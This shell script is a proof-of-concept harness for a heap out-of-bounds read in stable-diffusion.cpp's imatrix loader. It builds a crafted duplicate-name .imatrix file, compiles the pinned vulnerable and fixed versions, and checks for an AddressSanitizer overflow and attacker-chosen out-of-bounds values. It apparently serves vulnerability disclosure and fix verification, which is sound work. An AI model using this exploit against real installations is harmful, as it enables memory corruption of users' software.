#!/bin/sh
# sdimatrix2shell — rebuild the vulnerable and fixed pinned stable-diffusion.cpp
# tags, extract the verbatim IMatrixCollector::load_imatrix body, and drive it
# with a crafted duplicate-name .imatrix. Entirely in-process: no network
# target, listener, socket or external probe is contacted at run time.
set -u
ROOT=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SRC=$ROOT/src
BUILD=$ROOT/build
EV=$ROOT/evidence
mkdir -p "$SRC" "$BUILD" "$EV"

VULN_TAG=master-742-1a13107
FIXED_TAG=master-763-4fcc6fe
VULN_COMMIT=1a13107bac236b0cd6fadbf5c264f3644874ba4f
FIXED_COMMIT=4fcc6fef10c6f686801c6e257b22cd6a3deb906b

fail() { echo "PIN_FAIL $1"; exit 1; }
check() {
  expected=$1; file=$2
  [ -f "$file" ] || fail "$file missing"
  actual=$(sha256sum "$file" | cut -d' ' -f1)
  [ "$actual" = "$expected" ] || fail "$file expected=$expected actual=$actual"
}

# Public read-only provisioning; hashes are pinned and rechecked on every run.
fetch_tar() {
  commit=$1; tarball=$2; expected=$3
  if [ ! -f "$SRC/$tarball" ]; then
    curl -fsSL "https://codeload.github.com/leejet/stable-diffusion.cpp/tar.gz/$commit" -o "$SRC/$tarball" || return 1
  fi
  check "$expected" "$SRC/$tarball"
}
fetch_tar "$VULN_COMMIT" "$VULN_TAG.tar.gz" ce9bf4b7c7eba45ba4462354688c5409cf9aecd37c0ed64915653c9de90a0d72 || exit 1
fetch_tar "$FIXED_COMMIT" "$FIXED_TAG.tar.gz" f9b27fe71485a86f68ac2f0a84559b8d220736de6bae05e2bcd4189b6d435e74 || exit 1

PATCH=$SRC/fix-4fcc6fef.patch
if [ ! -f "$PATCH" ]; then
  curl -fsSL "https://github.com/leejet/stable-diffusion.cpp/commit/$FIXED_COMMIT.patch" -o "$PATCH" || exit 1
fi
check 792c4d07666ad59720653345d0b68beded615a55b6e3dedf79e182d939f659d6 "$PATCH" || exit 1
grep -q 'inconsistent size for a repeated entry' "$PATCH" || fail 'fix hunk absent'
check 9d5ea511cb942848b3fc6e5b51043dc7d7d029e3aec98a0fc7c4d43574e7450b "$ROOT/mkinput.cpp" || exit 1
check 4a26967209966ff9f209d0ff4f70bf84c22c978b25f370c2399b0c3f9845e19f "$ROOT/poc.cpp" || exit 1

# Verbatim function body from line 253 to EOF of each pinned imatrix.cpp.
extract_tree() {
  label=$1; tarball=$2; expected=$3
  dir=$BUILD/$label-src
  rm -rf "$dir" "$BUILD/$label"
  mkdir -p "$dir" "$BUILD/$label" || return 1
  tar xzf "$SRC/$tarball" -C "$dir" --strip-components=1 || return 1
  body=$BUILD/$label-body.inc
  awk 'NR>=253' "$dir/src/runtime/imatrix.cpp" > "$body" || return 1
  check "$expected" "$body" || return 1
  { printf '#line 253 "src/runtime/imatrix.cpp"\n'; cat "$body"; } > "$BUILD/$label/load_imatrix.inc" || return 1
}
extract_tree vuln "$VULN_TAG.tar.gz" 6d1a5fc1b09cefafe2fefaed1bc5fdae4ca8e425fa424facab99b257103362d1 || exit 1
extract_tree fixed "$FIXED_TAG.tar.gz" b45cf140d68f49e419876f433990bbe2ef6aff378c2feb1711530c16d5d8375a || exit 1

g++ -std=c++17 -g -O0 "$ROOT/mkinput.cpp" -o "$BUILD/mkinput" || exit 1
"$BUILD/mkinput" "$EV/attack.imatrix" attack || exit 1
"$BUILD/mkinput" "$EV/safe.imatrix" safe || exit 1

compile() {
  out=$1; cc=$2; san=$3; label=$4
  # shellcheck disable=SC2086
  "$cc" -std=c++17 -g -O0 -fno-omit-frame-pointer $san \
    -I"$BUILD/$label-src/src" -I"$BUILD/$label" \
    "$ROOT/poc.cpp" -o "$BUILD/$out" || return 1
}
SAN='-fsanitize=address'
compile poc-vuln-gcc-asan g++ "$SAN" vuln || exit 1
compile poc-vuln-clang-asan clang++ "$SAN" vuln || exit 1
compile poc-vuln-gcc-plain g++ '' vuln || exit 1
compile poc-vuln-clang-plain clang++ '' vuln || exit 1
compile poc-fixed-gcc-asan g++ "$SAN" fixed || exit 1
compile poc-fixed-clang-asan clang++ "$SAN" fixed || exit 1
compile poc-fixed-gcc-plain g++ '' fixed || exit 1

PASS=0; FAIL=0
report() {
  name=$1; shift
  if "$@"; then echo "CHECK $name PASS"; PASS=$((PASS + 1))
  else echo "CHECK $name FAIL"; FAIL=$((FAIL + 1)); fi
}
asan_oob() {
  grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' "$1" &&
  grep -q 'READ of size 4' "$1" &&
  grep -q '0 bytes after 4-byte region' "$1" &&
  grep -q 'src/runtime/imatrix.cpp:302' "$1"
}
fixed_reject() {
  ! grep -q 'AddressSanitizer' "$1" &&
  grep -q 'inconsistent size for a repeated entry' "$1" &&
  grep -q 'ok=0' "$1"
}
chosen_oob() {
  ! grep -q 'AddressSanitizer' "$1" &&
  grep -q 'ok=1' "$1" &&
  grep -q 'counts_oob1=0x41414141' "$1" &&
  grep -q 'counts_oob2=0x41414141' "$1"
}
clean_run() {
  ! grep -q 'AddressSanitizer' "$1" && grep -q 'ok=1' "$1"
}
run_case() {
  bin=$1; input=$2; mode=$3; out=$4
  "$BUILD/$bin" "$EV/$input" "$mode" > "$out" 2>&1
}

run_case poc-vuln-gcc-asan attack.imatrix attack "$EV/vuln-gcc-asan-attack.out"
report vuln-gcc-asan-attack asan_oob "$EV/vuln-gcc-asan-attack.out"
run_case poc-vuln-clang-asan attack.imatrix attack "$EV/vuln-clang-asan-attack.out"
report vuln-clang-asan-attack asan_oob "$EV/vuln-clang-asan-attack.out"
run_case poc-fixed-gcc-asan attack.imatrix attack "$EV/fixed-gcc-asan-attack.out"
report fixed-gcc-asan-attack fixed_reject "$EV/fixed-gcc-asan-attack.out"
run_case poc-fixed-clang-asan attack.imatrix attack "$EV/fixed-clang-asan-attack.out"
report fixed-clang-asan-attack fixed_reject "$EV/fixed-clang-asan-attack.out"
run_case poc-vuln-gcc-plain attack.imatrix attack "$EV/vuln-gcc-plain-attack.out"
report vuln-gcc-plain-attack chosen_oob "$EV/vuln-gcc-plain-attack.out"
run_case poc-vuln-clang-plain attack.imatrix attack "$EV/vuln-clang-plain-attack.out"
report vuln-clang-plain-attack chosen_oob "$EV/vuln-clang-plain-attack.out"
run_case poc-fixed-gcc-plain attack.imatrix attack "$EV/fixed-gcc-plain-attack.out"
report fixed-gcc-plain-attack fixed_reject "$EV/fixed-gcc-plain-attack.out"
run_case poc-vuln-gcc-asan safe.imatrix safe "$EV/vuln-gcc-asan-safe.out"
report vuln-gcc-asan-safe clean_run "$EV/vuln-gcc-asan-safe.out"
run_case poc-fixed-gcc-asan safe.imatrix safe "$EV/fixed-gcc-asan-safe.out"
report fixed-gcc-asan-safe clean_run "$EV/fixed-gcc-asan-safe.out"
run_case poc-vuln-gcc-plain safe.imatrix safe "$EV/vuln-gcc-plain-safe.out"
report vuln-gcc-plain-safe clean_run "$EV/vuln-gcc-plain-safe.out"

echo "RESULT PASS=$PASS FAIL=$FAIL"
[ "$FAIL" = 0 ]
